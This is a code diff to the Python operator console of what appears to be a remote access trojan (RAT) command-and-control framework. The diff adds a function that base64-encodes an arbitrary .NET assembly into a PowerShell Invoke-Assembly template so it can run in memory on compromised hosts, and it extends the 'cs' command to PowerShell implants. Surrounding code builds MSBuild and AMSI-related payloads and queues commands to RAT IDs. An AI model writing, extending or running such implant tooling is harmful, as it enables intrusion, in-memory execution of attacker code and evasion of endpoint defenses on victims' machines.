@@ -47,7 +47,7 @@ def print_banner():
     $$ |  $$ | $$$$$$$ |$$ /  $$ |$$ |  \__| $$$$$$$ |  $$ |    \$$$$$$\        (    / _/    /' o O| ,_( ))___     (`
     $$ |  $$ |$$  __$$ |$$ |  $$ |$$ |      $$  __$$ |  $$ |$$\  \____$$\        ` -|   )_  /o_O_'_(  \\'    _ `\    )
     $$$$$$$  |\$$$$$$$ |\$$$$$$$ |$$ |      \$$$$$$$ |  \$$$$  |$$$$$$$  |          `"\"\"\"`            =`---<___/---'
-    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v1.0 Rattata                    "`
+    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v1.0.1 Better than Rizzo        "`
     """
     print(banner)
 
@@ -135,6 +135,20 @@ def create_psscript(filepath, extra_cmds=""):
         b64data = base64.b64encode(data.encode('utf-8')).decode('utf-8')
         return(b64data)
 
+def send_invoke_assembly(input_data):
+    assembly_path = input_data.split(" ")[1]
+
+    with open(os.getcwd() + "/resources/Invoke-Assembly.ps1" , "r") as fd:
+        invoke_assembly_data = fd.read()
+
+    with open(Path(assembly_path).resolve() , "rb") as fd:
+        assembly_data = fd.read()
+
+    invoke_assembly_data = invoke_assembly_data.replace("~~ARGUMENTS~~", parse_c_sharp_args(input_data))
+    invoke_assembly_data = invoke_assembly_data.replace("~~ASSEMBLY~~", base64.b64encode(assembly_data).decode('utf-8'))
+    b64data = base64.b64encode(invoke_assembly_data.encode('utf-8')).decode('utf-8')
+    return(b64data)
+
 def send_nps_msbuild_xml(input_data, ratID):
     ps_script_path = input_data.split(" ")[1]
     amsi_data = ""
@@ -188,7 +202,7 @@ def parse_c_sharp_args(argument_string):
     args = " ".join(args)
 
     if(not args):
-        return("  ")
+        return('""')
     for ch in args:
         if(ch == " " and not inside_quotes):
             stringlist.append(stringbuilder) # Add finished string to the list
@@ -422,15 +436,15 @@ if __name__ == "__main__":
                             continue
 
                     elif(str.startswith(inp, "cs ")):
-                        try:
-                            filepath = inp.split(" ")[1]
-                            if(types[ratID] == "ps1"):
-                                print("[!] Powershell rats do not support \"cs\"!")
-                            else:
-                                inp = "cs " + msbuild_path + " " + send_csharper_msbuild_xml(inp, ratID)
-                        except:
-                            print("[!] Could not open file " + filepath + " for reading or other unexpected error occured")
-                            continue
+                        #try:
+                        filepath = inp.split(" ")[1]
+                        if(types[ratID] == "ps1"):
+                            inp = "cs " + send_invoke_assembly(inp)
+                        else:
+                            inp = "cs " + msbuild_path + " " + send_csharper_msbuild_xml(inp, ratID)
+                        #except:
+                        #    print("[!] Could not open file " + filepath + " for reading or other unexpected error occured")
+                        #    continue
 
                     print("[*] Queued command " + colors(inp) + " for " + colors(ratID))
                     if(ratID == "all"):
